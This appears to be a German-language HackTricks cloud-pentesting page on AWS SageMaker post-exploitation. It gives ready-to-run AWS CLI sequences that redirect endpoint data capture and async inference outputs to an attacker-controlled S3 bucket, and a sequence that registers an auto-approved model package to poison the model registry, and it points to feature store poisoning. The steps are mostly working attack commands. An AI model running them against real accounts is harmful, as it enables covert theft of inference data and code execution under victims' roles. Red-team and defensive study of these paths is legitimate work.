# AWS - SageMaker Post-Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## SageMaker Endpoint-Datenabfluss über UpdateEndpoint DataCaptureConfig

Missbrauche die SageMaker-Endpoint-Verwaltung, um vollständiges Anfrage-/Antwort-Capturing in einen vom Angreifer kontrollierten S3-Bucket zu aktivieren, ohne das model oder container zu berühren. Verwendet ein Rolling Update mit null/geringer Ausfallzeit und erfordert lediglich Endpoint-Management-Berechtigungen.

### Anforderungen
- IAM: `sagemaker:DescribeEndpoint`, `sagemaker:DescribeEndpointConfig`, `sagemaker:CreateEndpointConfig`, `sagemaker:UpdateEndpoint`
- S3: `s3:CreateBucket` (oder benutze einen bestehenden Bucket im selben Account)
- Optional (bei Verwendung von SSE‑KMS): `kms:Encrypt` auf dem gewählten CMK
- Ziel: Ein vorhandener InService Echtzeit-Endpoint im selben Account/Region

### Schritte
1) Identifiziere einen InService-Endpoint und sammle die aktuellen Produktionsvarianten
```bash
REGION=${REGION:-us-east-1}
EP=$(aws sagemaker list-endpoints --region $REGION --query "Endpoints[?EndpointStatus=='InService']|[0].EndpointName" --output text)
echo "Endpoint=$EP"
CFG=$(aws sagemaker describe-endpoint --region $REGION --endpoint-name "$EP" --query EndpointConfigName --output text)
echo "EndpointConfig=$CFG"
aws sagemaker describe-endpoint-config --region $REGION --endpoint-config-name "$CFG" --query ProductionVariants > /tmp/pv.json
```
2) Attacker-S3-Ziel für captures vorbereiten
```bash
ACC=$(aws sts get-caller-identity --query Account --output text)
BUCKET=ht-sm-capture-$ACC-$(date +%s)
aws s3 mb s3://$BUCKET --region $REGION
```
3) Erstelle eine neue EndpointConfig, die die gleichen Varianten beibehält, aber DataCapture auf den attacker bucket aktiviert

Hinweis: Verwende explizite Content-Types, die der CLI-Validierung genügen.
```bash
NEWCFG=${CFG}-dc
cat > /tmp/dc.json << JSON
{
"EnableCapture": true,
"InitialSamplingPercentage": 100,
"DestinationS3Uri": "s3://$BUCKET/capture",
"CaptureOptions": [
{"CaptureMode": "Input"},
{"CaptureMode": "Output"}
],
"CaptureContentTypeHeader": {
"JsonContentTypes": ["application/json"],
"CsvContentTypes": ["text/csv"]
}
}
JSON
aws sagemaker create-endpoint-config \
--region $REGION \
--endpoint-config-name "$NEWCFG" \
--production-variants file:///tmp/pv.json \
--data-capture-config file:///tmp/dc.json
```
4) Neue Konfiguration per rolling update anwenden (minimale/keine Ausfallzeit)
```bash
aws sagemaker update-endpoint --region $REGION --endpoint-name "$EP" --endpoint-config-name "$NEWCFG"
aws sagemaker wait endpoint-in-service --region $REGION --endpoint-name "$EP"
```
5) Erzeuge mindestens einen Inference-Call (optional, falls Live-Traffic vorhanden ist)
```bash
echo '{"inputs":[1,2,3]}' > /tmp/payload.json
aws sagemaker-runtime invoke-endpoint --region $REGION --endpoint-name "$EP" \
--content-type application/json --accept application/json \
--body fileb:///tmp/payload.json /tmp/out.bin || true
```
6) Captures im attacker S3 validieren
```bash
aws s3 ls s3://$BUCKET/capture/ --recursive --human-readable --summarize
```
### Auswirkungen
- Vollständige Exfiltration von Echtzeit-Inference-Anfrage- und Antwort-Payloads (sowie Metadaten) vom Ziel-Endpoint in ein vom Angreifer kontrolliertes S3-Bucket.
- Keine Änderungen am Modell/Container-Image und nur Änderungen auf Endpoint-Ebene, was einen unauffälligen Daten-Diebstahlpfad mit minimalen betrieblichen Störungen ermöglicht.


## SageMaker async inference output hijack via UpdateEndpoint AsyncInferenceConfig

Missbrauche das Endpoint-Management, um asynchrone Inference-Ausgaben an ein vom Angreifer kontrolliertes S3-Bucket umzuleiten, indem du die aktuelle EndpointConfig klonst und AsyncInferenceConfig.OutputConfig S3OutputPath/S3FailurePath setzt. Dadurch werden Modellvorhersagen (und alle vom Container transformierten Eingaben) exfiltriert, ohne das Modell/den Container zu ändern.

### Anforderungen
- IAM: `sagemaker:DescribeEndpoint`, `sagemaker:DescribeEndpointConfig`, `sagemaker:CreateEndpointConfig`, `sagemaker:UpdateEndpoint`
- S3: Fähigkeit, in das Angreifer-S3-Bucket zu schreiben (über die model execution role oder eine zu großzügige Bucket-Policy)
- Ziel: Ein InService-Endpoint, bei dem asynchrone Aufrufe verwendet werden (oder verwendet werden sollen)

### Schritte
1) Sammle die aktuellen ProductionVariants vom Ziel-Endpoint
```bash
REGION=${REGION:-us-east-1}
EP=<target-endpoint-name>
CUR_CFG=$(aws sagemaker describe-endpoint --region $REGION --endpoint-name "$EP" --query EndpointConfigName --output text)
aws sagemaker describe-endpoint-config --region $REGION --endpoint-config-name "$CUR_CFG" --query ProductionVariants > /tmp/pv.json
```
2) Erstelle einen Angreifer-Bucket (stelle sicher, dass die model execution role PutObject darauf ausführen kann)
```bash
ACC=$(aws sts get-caller-identity --query Account --output text)
BUCKET=ht-sm-async-exfil-$ACC-$(date +%s)
aws s3 mb s3://$BUCKET --region $REGION || true
```
3) Clone EndpointConfig und hijack AsyncInference outputs zum attacker bucket
```bash
NEWCFG=${CUR_CFG}-async-exfil
cat > /tmp/async_cfg.json << JSON
{"OutputConfig": {"S3OutputPath": "s3://$BUCKET/async-out/", "S3FailurePath": "s3://$BUCKET/async-fail/"}}
JSON
aws sagemaker create-endpoint-config --region $REGION   --endpoint-config-name "$NEWCFG"   --production-variants file:///tmp/pv.json   --async-inference-config file:///tmp/async_cfg.json
aws sagemaker update-endpoint --region $REGION --endpoint-name "$EP" --endpoint-config-name "$NEWCFG"
aws sagemaker wait endpoint-in-service --region $REGION --endpoint-name "$EP"
```
4) Einen asynchronen Aufruf auslösen und prüfen, dass Objekte im S3 des Angreifers landen
```bash
aws s3 cp /etc/hosts s3://$BUCKET/inp.bin
aws sagemaker-runtime invoke-endpoint-async --region $REGION --endpoint-name "$EP" --input-location s3://$BUCKET/inp.bin >/tmp/async.json || true
sleep 30
aws s3 ls s3://$BUCKET/async-out/ --recursive || true
aws s3 ls s3://$BUCKET/async-fail/ --recursive || true
```
### Auswirkungen
- Leitet asynchrone Inference-Ergebnisse (und Error-Bodies) zu attacker-controlled S3 um und ermöglicht so die verdeckte exfiltration von predictions und potenziell sensiblen vor-/nachverarbeiteten Inputs, die vom container erzeugt werden, ohne Änderung von model code oder image und mit minimaler/keiner Downtime.


## SageMaker Model Registry supply-chain injection via CreateModelPackage(Approved)

Wenn ein Angreifer CreateModelPackage auf einer Ziel SageMaker Model Package Group ausführen kann, kann er eine neue Modellversion registrieren, die auf ein vom Angreifer kontrolliertes container image zeigt und sie sofort als Approved markieren. Viele CI/CD-Pipelines deployen Approved-Modellversionen automatisch zu Endpoints oder training jobs, was zur attacker code execution unter den Execution Roles des Dienstes führt. Eine kontoübergreifende Exposition kann durch eine permissive ModelPackageGroup resource policy verstärkt werden.

### Anforderungen
- IAM (Minimum, um eine bestehende Gruppe zu vergiften): `sagemaker:CreateModelPackage` auf der Ziel-ModelPackageGroup
- Optional (um eine Gruppe zu erstellen, falls keine existiert): `sagemaker:CreateModelPackageGroup`
- S3: Lesezugriff auf die referenzierte ModelDataUrl (oder Hosten von vom Angreifer kontrollierten Artefakten)
- Ziel: Eine Model Package Group, die nachgelagerte Automation auf Approved-Versionen überwacht

### Schritte
1) Region setzen und eine Ziel Model Package Group erstellen/finden
```bash
REGION=${REGION:-us-east-1}
MPG=victim-group-$(date +%s)
aws sagemaker create-model-package-group --region $REGION --model-package-group-name $MPG --model-package-group-description "test group"
```
2) Dummy-Modell-Daten in S3 vorbereiten
```bash
ACC=$(aws sts get-caller-identity --query Account --output text)
BUCKET=ht-sm-mpkg-$ACC-$(date +%s)
aws s3 mb s3://$BUCKET --region $REGION
head -c 1024 </dev/urandom > /tmp/model.tar.gz
aws s3 cp /tmp/model.tar.gz s3://$BUCKET/model/model.tar.gz --region $REGION
```
3) Registriere eine bösartige (hier harmlose) Approved model package version, die auf ein öffentliches AWS DLC-Image verweist
```bash
IMG="683313688378.dkr.ecr.$REGION.amazonaws.com/sagemaker-scikit-learn:1.2-1-cpu-py3"
cat > /tmp/inf.json << JSON
{
"Containers": [
{
"Image": "$IMG",
"ModelDataUrl": "s3://$BUCKET/model/model.tar.gz"
}
],
"SupportedContentTypes": ["text/csv"],
"SupportedResponseMIMETypes": ["text/csv"]
}
JSON
aws sagemaker create-model-package --region $REGION   --model-package-group-name $MPG   --model-approval-status Approved   --inference-specification file:///tmp/inf.json
```
4) Überprüfe, dass die neue Approved-Version vorhanden ist
```bash
aws sagemaker list-model-packages --region $REGION --model-package-group-name $MPG --output table
```
### Auswirkungen
- Poison the Model Registry mit einer Approved-Version, die auf angreiferkontrollierten Code verweist. Pipelines, die Approved-Modelle automatisch bereitstellen, können das Angreifer-Image ziehen und ausführen, was zur Codeausführung unter endpoint/training roles führt.
- Mit einer permissiven ModelPackageGroup resource policy (PutModelPackageGroupPolicy) kann dieser Missbrauch kontoübergreifend ausgelöst werden.

## Feature store poisoning

Missbrauche `sagemaker:PutRecord` auf einer Feature Group mit aktiviertem OnlineStore, um Live-Feature-Werte zu überschreiben, die von online inference verwendet werden. In Kombination mit `sagemaker:GetRecord` kann ein Angreifer sensitive Features lesen. Dafür ist kein Zugriff auf models oder endpoints erforderlich.

{{#ref}}
feature-store-poisoning.md
{{/ref}}
